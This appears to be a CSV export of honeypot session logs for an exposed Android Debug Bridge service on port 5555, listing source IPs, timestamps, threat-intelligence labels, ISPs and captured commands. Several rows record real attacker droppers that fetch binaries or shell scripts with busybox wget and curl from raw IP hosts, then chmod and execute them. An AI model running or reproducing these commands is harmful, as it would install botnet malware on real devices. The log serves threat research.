session_id,Anon Src IP,src_port,Dst IP,dest_port,start_time,end_time,duration,sensor,commands,VT Labels,VT Reputation,Geo Location,ISP,Malicious_Flag
217b30301223,186.126.138.102,54640,172.18.0.2,5555,2025-03-08T02:48:44.916813Z,2025-03-08T02:53:45.111509Z,300.19,honeypot01,,"malicious, malware",-1,US,AS63949 Akamai Connected Cloud,0
8ac0029abcae,186.126.138.102,54654,172.18.0.2,5555,2025-03-08T02:48:50.958762Z,2025-03-08T02:53:51.165535Z,300.21,honeypot01,,"malicious, malware",-1,US,AS63949 Akamai Connected Cloud,0
9f4c59bb6074,186.126.138.102,51096,172.18.0.2,5555,2025-03-08T02:48:55.984476Z,2025-03-08T02:53:56.181007Z,300.2,honeypot01,,"malicious, malware",-1,US,AS63949 Akamai Connected Cloud,0
7211a0505d75,186.126.138.102,51104,172.18.0.2,5555,2025-03-08T02:49:01.011129Z,2025-03-08T02:54:01.209296Z,300.2,honeypot01,,"malicious, malware",-1,US,AS63949 Akamai Connected Cloud,0
350835bee0f5,186.126.138.102,55772,172.18.0.2,5555,2025-03-08T02:49:09.084399Z,2025-03-08T02:54:09.090451Z,300.01,honeypot01,,"malicious, malware",-1,US,AS63949 Akamai Connected Cloud,0
22415aa272c0,140.46.17.128,48848,172.28.0.2,5555,2025-03-06T04:12:44.736171Z,2025-03-06T04:17:44.851348Z,300.12,honeypot01,,malware,0,RU,AS8359 MTS PJSC,0
82d34bdf1b9b,124.211.11.175,49612,172.28.0.2,5555,2025-03-06T09:09:39.699315Z,2025-03-06T09:10:25.068714Z,45.37,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
ed0fa426246c,85.123.230.99,58226,172.28.0.2,5555,2025-03-06T09:31:58.544619Z,2025-03-06T09:36:58.552721Z,300.01,honeypot01,,"malicious, phishing, malware",-2,AU,"AS14061 DigitalOcean, LLC",0
ad98fa077037,85.123.230.99,60868,172.28.0.2,5555,2025-03-06T09:32:09.168033Z,2025-03-06T09:37:09.168992Z,300.0,honeypot01,,"malicious, phishing, malware",-2,AU,"AS14061 DigitalOcean, LLC",0
62e1053146e1,85.123.230.99,52278,172.28.0.2,5555,2025-03-06T09:32:19.172126Z,2025-03-06T09:37:19.368150Z,300.2,honeypot01,,"malicious, phishing, malware",-2,AU,"AS14061 DigitalOcean, LLC",0
dbcdbddb8128,85.123.230.99,52886,172.28.0.2,5555,2025-03-06T09:32:29.170356Z,2025-03-06T09:37:29.173548Z,300.0,honeypot01,,"malicious, phishing, malware",-2,AU,"AS14061 DigitalOcean, LLC",0
1b95b29643f3,85.123.230.99,56380,172.28.0.2,5555,2025-03-06T09:32:39.170617Z,2025-03-06T09:37:39.176998Z,300.01,honeypot01,,"malicious, phishing, malware",-2,AU,"AS14061 DigitalOcean, LLC",0
c24da2b0e9e3,85.123.230.99,35252,172.28.0.2,5555,2025-03-06T09:32:50.191774Z,2025-03-06T09:37:50.381469Z,300.19,honeypot01,,"malicious, phishing, malware",-2,AU,"AS14061 DigitalOcean, LLC",0
25f333bde3c0,124.211.11.175,47244,172.28.0.2,5555,2025-03-06T09:53:42.310941Z,2025-03-06T09:54:28.061929Z,45.75,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
1a10bf32a5e4,124.211.11.175,52904,172.28.0.2,5555,2025-03-06T10:46:51.758127Z,2025-03-06T10:47:37.124192Z,45.37,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
d547ccf6294d,69.173.176.234,54762,172.28.0.2,5555,2025-03-06T10:52:25.439332Z,2025-03-06T10:57:25.505058Z,300.07,honeypot01,,"malicious, malware, phishing",-59,US,AS174 Cogent Communications,1
35c71ce5216d,124.211.11.175,38098,172.28.0.2,5555,2025-03-06T11:47:15.513014Z,2025-03-06T11:48:01.058876Z,45.55,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
bcc90f56c641,124.211.11.175,43952,172.28.0.2,5555,2025-03-06T12:26:07.761148Z,2025-03-06T12:26:53.128067Z,45.37,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
9c4fff07a836,211.131.226.186,64343,172.28.0.2,5555,2025-03-06T16:15:49.809415Z,2025-03-06T16:20:41.324785Z,291.52,honeypot01,,"malicious, phishing, malware",-4,RU,AS198953 Proton66 OOO,0
928455abc1a3,133.94.237.19,21648,172.28.0.2,5555,2025-03-06T19:45:12.542624Z,2025-03-06T19:50:12.718075Z,300.18,honeypot01,,"malicious, phishing, malware",-4,US,AS6939 Hurricane Electric LLC,0
ed65ff6b40d9,124.211.11.175,59522,172.28.0.2,5555,2025-03-06T22:13:44.321727Z,2025-03-06T22:14:26.438149Z,42.12,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
d3bfbdada8e8,124.211.11.175,39830,172.28.0.2,5555,2025-03-06T22:53:08.890605Z,2025-03-06T22:53:54.065491Z,45.17,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
453b7b829c47,124.211.11.175,51970,172.28.0.2,5555,2025-03-07T00:28:56.298322Z,2025-03-07T00:29:42.067009Z,45.77,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
e93bc1ddfaff,12.47.16.58,65058,172.28.0.2,5555,2025-03-07T00:46:35.760210Z,2025-03-07T00:51:35.893883Z,300.13,honeypot01,,"malicious, malware, phishing",-56,BR,AS396982 Google LLC,1
c77031bee26f,12.47.16.58,62606,172.28.0.2,5555,2025-03-07T00:46:45.756138Z,2025-03-07T00:51:45.906581Z,300.15,honeypot01,,"malicious, malware, phishing",-56,BR,AS396982 Google LLC,1
333bcfa97177,191.203.117.89,50034,172.28.0.2,5555,2025-03-07T02:46:10.284018Z,2025-03-07T02:51:10.314423Z,300.03,honeypot01,,malware,0,IN,AS24186 RailTel Corporation of India Ltd,0
f2850ccdca6f,69.180.141.33,53345,172.24.0.2,5555,2025-03-05T04:42:44.533148Z,2025-03-05T04:47:44.679787Z,300.15,honeypot01,,"phishing, malicious, malware",-2,US,AS21859 Zenlayer Inc,0
f061acebb066,208.51.112.252,24964,172.24.0.2,5555,2025-03-05T05:05:56.765096Z,2025-03-05T05:06:00.016207Z,3.25,honeypot01,,"malicious, malware",0,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",0
12ede96e5271,208.51.112.252,21866,172.24.0.2,5555,2025-03-05T05:06:10.244034Z,2025-03-05T05:06:13.254623Z,3.01,honeypot01,,"malicious, malware",0,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",0
2752e2926b9d,208.51.112.252,27894,172.24.0.2,5555,2025-03-05T05:06:23.480062Z,2025-03-05T05:06:26.505980Z,3.03,honeypot01,,"malicious, malware",0,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",0
8deb6a8a7505,208.51.112.252,28916,172.24.0.2,5555,2025-03-05T05:06:36.736841Z,2025-03-05T05:06:39.741672Z,3.0,honeypot01,,"malicious, malware",0,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",0
4ea3421e63f7,18.18.97.248,35666,172.24.0.2,5555,2025-03-05T08:03:46.064058Z,2025-03-05T08:08:46.331501Z,300.27,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
6bc792beabb8,124.211.11.175,45768,172.24.0.2,5555,2025-03-05T09:38:47.494298Z,2025-03-05T09:39:33.060826Z,45.57,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
fad4ed58e6fa,124.211.11.175,39900,172.24.0.2,5555,2025-03-05T10:48:27.618420Z,2025-03-05T10:49:13.067637Z,45.45,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
32617c2f211f,124.211.11.175,43908,172.24.0.2,5555,2025-03-05T11:07:49.931537Z,2025-03-05T11:08:35.064715Z,45.13,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
322f917232e5,68.68.183.44,33902,172.24.0.2,5555,2025-03-05T11:43:12.086618Z,2025-03-05T11:48:12.269875Z,300.18,honeypot01,,malware,-1,SG,"AS26496 GoDaddy.com, LLC",0
9d9689d05387,124.211.11.175,43216,172.24.0.2,5555,2025-03-05T12:39:02.570481Z,2025-03-05T12:39:48.070190Z,45.5,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
f301ac6ec522,132.202.251.76,13619,172.24.0.2,5555,2025-03-05T13:20:48.484380Z,2025-03-05T13:25:48.633818Z,300.15,honeypot01,,"malicious, phishing, malware",-3,US,AS6939 Hurricane Electric LLC,0
4502cc712b3c,5.59.117.116,59052,172.24.0.2,5555,2025-03-05T19:48:46.719440Z,2025-03-05T19:53:47.515702Z,300.8,honeypot01,cd /data/local/tmp/; busybox wget http://193.32.162.27/w.sh; sh w.sh; curl http://193.32.162.27/c.sh; sh c.sh,malware,0,NL,AS401116 Nybula LLC,0
1788109a5638,27.24.177.228,63554,172.24.0.2,5555,2025-03-05T20:06:09.114502Z,2025-03-05T20:11:09.471797Z,300.36,honeypot01,,"malicious, malware, phishing",-12,US,AS6939 Hurricane Electric LLC,0
e142b4dcbe40,124.211.11.175,43026,172.24.0.2,5555,2025-03-05T21:23:56.168527Z,2025-03-05T21:24:42.066589Z,45.9,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
ac97ad307b77,76.69.240.77,44534,172.24.0.2,5555,2025-03-05T21:41:32.944214Z,2025-03-05T21:46:33.167767Z,300.22,honeypot01,,"malicious, malware",0,DE,,0
16adb3056ece,240.110.12.140,37672,172.24.0.2,5555,2025-03-05T22:07:55.391912Z,2025-03-05T22:12:55.590202Z,300.2,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
8b9a23f19e7e,240.110.12.140,37686,172.24.0.2,5555,2025-03-05T22:07:56.665008Z,2025-03-05T22:12:56.856784Z,300.19,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
16281470b62b,240.110.12.140,37706,172.24.0.2,5555,2025-03-05T22:07:59.483361Z,2025-03-05T22:12:59.666000Z,300.18,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
9e338361b62c,240.110.12.140,37746,172.24.0.2,5555,2025-03-05T22:08:02.490226Z,2025-03-05T22:13:02.687933Z,300.2,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
0a2833877502,240.110.12.140,37748,172.24.0.2,5555,2025-03-05T22:08:04.879362Z,2025-03-05T22:13:05.025566Z,300.15,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
277950a20588,240.110.12.140,50920,172.24.0.2,5555,2025-03-05T22:08:35.434620Z,2025-03-05T22:13:35.621245Z,300.19,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
893767b83494,124.211.11.175,54214,172.24.0.2,5555,2025-03-05T22:30:10.293991Z,2025-03-05T22:30:56.066057Z,45.77,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
04985c45f277,124.211.11.175,32996,172.24.0.2,5555,2025-03-05T23:19:39.124200Z,2025-03-05T23:20:25.065819Z,45.94,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
333313f8eb24,124.211.11.175,49158,172.24.0.2,5555,2025-03-06T00:04:56.759946Z,2025-03-06T00:05:42.126221Z,45.37,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
36cdabfa3a6a,124.211.11.175,55538,172.24.0.2,5555,2025-03-06T00:48:32.747407Z,2025-03-06T00:49:18.111904Z,45.36,honeypot01,cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
a442ba6d1df3,206.86.187.38,36666,192.168.0.2,5555,2025-03-04T05:13:13.621248Z,2025-03-04T05:18:13.788248Z,300.17,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
e867d28d9cf9,11.54.0.154,42354,192.168.0.2,5555,2025-03-04T05:52:51.455393Z,2025-03-04T05:57:51.544094Z,300.09,honeypot01,,"malicious, phishing, malware",-57,NL,AS50219 Valence Technology Co.,1
4b9669fc9bb7,11.54.0.154,38120,192.168.0.2,5555,2025-03-04T06:08:16.054044Z,2025-03-04T06:13:16.150492Z,300.1,honeypot01,,"malicious, phishing, malware",-57,NL,AS50219 Valence Technology Co.,1
c891ca9fb24d,68.68.183.44,57878,192.168.0.2,5555,2025-03-04T08:04:38.219040Z,2025-03-04T08:09:38.385607Z,300.17,honeypot01,,malware,-1,SG,"AS26496 GoDaddy.com, LLC",0
29ff6be9c23b,137.104.47.123,24476,192.168.0.2,5555,2025-03-04T09:29:53.931898Z,2025-03-04T09:34:54.099280Z,300.17,honeypot01,,"malicious, phishing, malware",-18,US,AS6939 Hurricane Electric LLC,0
871a3680f615,5.59.92.13,43006,192.168.0.2,5555,2025-03-04T12:20:35.288541Z,2025-03-04T12:21:21.064250Z,45.78,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, phishing, malware",0,NL,AS401120 cheapy.host LLC,0
738fa75238bc,211.65.202.212,8274,192.168.0.2,5555,2025-03-04T15:55:24.986500Z,2025-03-04T16:00:25.022327Z,300.04,honeypot01,,"malicious, phishing, malware",-2,US,AS63949 Akamai Connected Cloud,0
257036b1d9c1,211.65.202.212,19926,192.168.0.2,5555,2025-03-04T15:55:36.087087Z,2025-03-04T16:00:36.279170Z,300.19,honeypot01,,"malicious, phishing, malware",-2,US,AS63949 Akamai Connected Cloud,0
9011ae69efc5,83.231.225.144,43616,192.168.0.2,5555,2025-03-04T16:02:37.286575Z,2025-03-04T16:07:37.883011Z,300.6,honeypot01,,"malicious, phishing, malware",-60,US,AS63949 Akamai Connected Cloud,1
4a98272ee86d,83.231.225.144,43617,192.168.0.2,5555,2025-03-04T16:03:23.175441Z,2025-03-04T16:03:26.354570Z,3.18,honeypot01,,"malicious, phishing, malware",-60,US,AS63949 Akamai Connected Cloud,1
9e7096ccf377,76.69.240.77,51058,192.168.0.2,5555,2025-03-04T17:49:38.448290Z,2025-03-04T17:54:38.671562Z,300.22,honeypot01,,"malicious, malware",0,DE,,0
0f4a61dc6cd7,108.90.123.159,64820,192.168.0.2,5555,2025-03-04T20:04:24.095807Z,2025-03-04T20:09:24.170941Z,300.08,honeypot01,,"malicious, phishing, malware",-2,US,AS396982 Google LLC,0
94a67680db40,108.90.123.159,64274,192.168.0.2,5555,2025-03-04T20:04:34.094927Z,2025-03-04T20:09:34.181285Z,300.09,honeypot01,,"malicious, phishing, malware",-2,US,AS396982 Google LLC,0
13e5f63af177,211.164.80.176,53292,192.168.0.2,5555,2025-03-05T00:04:39.708526Z,2025-03-05T00:09:39.822169Z,300.11,honeypot01,,,0,BR,AS268645 FUTURE DIGITAL TECHNOLOGY E TELECOM LTDA EPP,0
8523c623b86b,234.134.62.159,49312,192.168.0.2,5555,2025-03-05T02:00:23.244453Z,2025-03-05T02:05:23.271823Z,300.03,honeypot01,,"malicious, malware",-52,US,AS8075 Microsoft Corporation,1
7b57d397f471,200.87.179.250,58865,192.168.128.2,5555,2025-03-03T07:03:47.233298Z,2025-03-03T07:08:47.335379Z,300.1,honeypot01,,"malware, phishing, malicious",0,FR,AS16276 OVH SAS,0
21ac50f00e49,200.87.179.240,55779,192.168.128.2,5555,2025-03-03T07:03:47.440174Z,2025-03-03T07:08:47.706757Z,300.27,honeypot01,,malware,0,FR,AS16276 OVH SAS,0
ea37d757d09b,93.225.47.253,47326,192.168.128.2,5555,2025-03-03T13:14:25.061216Z,2025-03-03T13:19:25.255676Z,300.19,honeypot01,,"malicious, malware, phishing",-1,CA,"AS14061 DigitalOcean, LLC",0
1e66d2051ae3,93.225.47.253,34576,192.168.128.2,5555,2025-03-03T13:14:35.309570Z,2025-03-03T13:19:35.455328Z,300.15,honeypot01,,"malicious, malware, phishing",-1,CA,"AS14061 DigitalOcean, LLC",0
cf23c20f59a1,93.225.47.253,33888,192.168.128.2,5555,2025-03-03T13:14:45.309413Z,2025-03-03T13:19:45.493478Z,300.18,honeypot01,,"malicious, malware, phishing",-1,CA,"AS14061 DigitalOcean, LLC",0
f9f56b55aa11,93.225.47.253,54518,192.168.128.2,5555,2025-03-03T13:14:55.314031Z,2025-03-03T13:19:55.480886Z,300.17,honeypot01,,"malicious, malware, phishing",-1,CA,"AS14061 DigitalOcean, LLC",0
1b06657e6ce3,93.225.47.253,44036,192.168.128.2,5555,2025-03-03T13:15:05.313893Z,2025-03-03T13:20:05.497811Z,300.18,honeypot01,,"malicious, malware, phishing",-1,CA,"AS14061 DigitalOcean, LLC",0
06319d70d359,93.225.47.253,56380,192.168.128.2,5555,2025-03-03T13:15:15.312585Z,2025-03-03T13:20:15.493333Z,300.18,honeypot01,,"malicious, malware, phishing",-1,CA,"AS14061 DigitalOcean, LLC",0
2a2b02f9c2d7,76.69.240.77,56286,192.168.128.2,5555,2025-03-03T13:33:15.300245Z,2025-03-03T13:38:15.503609Z,300.2,honeypot01,,"malicious, malware",0,DE,,0
c2b987b36df1,75.109.110.119,26539,192.168.128.2,5555,2025-03-03T14:59:42.914878Z,2025-03-03T15:04:43.067952Z,300.15,honeypot01,,"malicious, malware",0,MN,AS45204 GEMNET LLC,0
77db7ed60528,18.18.97.248,40888,192.168.128.2,5555,2025-03-03T15:54:55.501715Z,2025-03-03T15:59:55.747268Z,300.25,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
b43a7821a35d,133.94.131.146,48744,192.168.128.2,5555,2025-03-03T16:13:15.466002Z,2025-03-03T16:18:15.742795Z,300.28,honeypot01,,"malicious, phishing, malware",-4,US,AS6939 Hurricane Electric LLC,0
44a630d6746f,220.54.103.38,63692,172.24.0.2,5555,2025-03-02T17:38:33.188833Z,2025-03-02T17:43:33.264366Z,300.08,honeypot01,,"malicious, malware, phishing",0,GB,AS396982 Google LLC,0
486b1b745bc2,121.220.149.54,39128,172.30.0.2,5555,2025-03-01T03:55:48.328371Z,2025-03-01T04:00:48.514600Z,300.19,honeypot01,,"phishing, malicious",-1,JP,AS152194 CTG Server Limited,0
830795d68920,133.94.131.1,41841,172.30.0.2,5555,2025-03-01T04:13:04.267467Z,2025-03-01T04:18:04.441335Z,300.17,honeypot01,,"malicious, malware",-3,US,AS6939 Hurricane Electric LLC,0
941582d4b354,93.225.156.40,53336,172.30.0.2,5555,2025-03-01T07:32:48.663171Z,2025-03-01T07:37:48.765069Z,300.1,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
ec655334355a,93.225.156.40,54592,172.30.0.2,5555,2025-03-01T07:32:58.925803Z,2025-03-01T07:37:59.018771Z,300.09,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
7ba1c7dcb077,93.225.156.40,45880,172.30.0.2,5555,2025-03-01T07:33:09.953559Z,2025-03-01T07:38:10.060368Z,300.11,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
6e3b5563988c,93.225.156.40,56904,172.30.0.2,5555,2025-03-01T07:33:18.921836Z,2025-03-01T07:38:19.018440Z,300.1,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
0cffad39ac18,93.225.156.40,49364,172.30.0.2,5555,2025-03-01T07:33:28.919640Z,2025-03-01T07:38:29.017122Z,300.1,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
ab6f00350b0f,93.225.156.40,43168,172.30.0.2,5555,2025-03-01T07:33:38.931820Z,2025-03-01T07:38:39.127029Z,300.2,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
04e177602cdd,234.34.135.177,36104,172.30.0.2,5555,2025-03-01T18:26:17.335695Z,2025-03-01T18:31:17.395836Z,300.06,honeypot01,,"malware, malicious",0,US,AS8075 Microsoft Corporation,0
dade0a93cbb7,5.59.92.75,54312,172.30.0.2,5555,2025-03-02T00:26:59.478284Z,2025-03-02T00:27:45.055209Z,45.58,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, malware",0,NL,AS401120 cheapy.host LLC,0
e7e5bc479c90,240.143.56.197,53640,192.168.48.2,5555,2025-02-28T09:01:06.168547Z,2025-02-28T09:06:06.356619Z,300.19,honeypot01,,,-1,US,"AS16509 Amazon.com, Inc.",0
0348ca9c9110,240.143.56.197,40812,192.168.48.2,5555,2025-02-28T09:02:27.436658Z,2025-02-28T09:07:27.620243Z,300.18,honeypot01,,,-1,US,"AS16509 Amazon.com, Inc.",0
c39d9f2655bd,240.143.56.197,53074,192.168.48.2,5555,2025-02-28T09:04:05.198022Z,2025-02-28T09:09:05.200466Z,300.0,honeypot01,,,-1,US,"AS16509 Amazon.com, Inc.",0
4ec79e2eced1,240.143.56.197,57642,192.168.48.2,5555,2025-02-28T09:08:15.751383Z,2025-02-28T09:13:15.942500Z,300.19,honeypot01,,,-1,US,"AS16509 Amazon.com, Inc.",0
8bc1714e1f99,240.143.56.197,60504,192.168.48.2,5555,2025-02-28T09:09:04.997507Z,2025-02-28T09:14:05.183880Z,300.19,honeypot01,,,-1,US,"AS16509 Amazon.com, Inc.",0
79157a71890c,240.143.56.197,43260,192.168.48.2,5555,2025-02-28T09:11:19.850409Z,2025-02-28T09:16:20.041697Z,300.19,honeypot01,,,-1,US,"AS16509 Amazon.com, Inc.",0
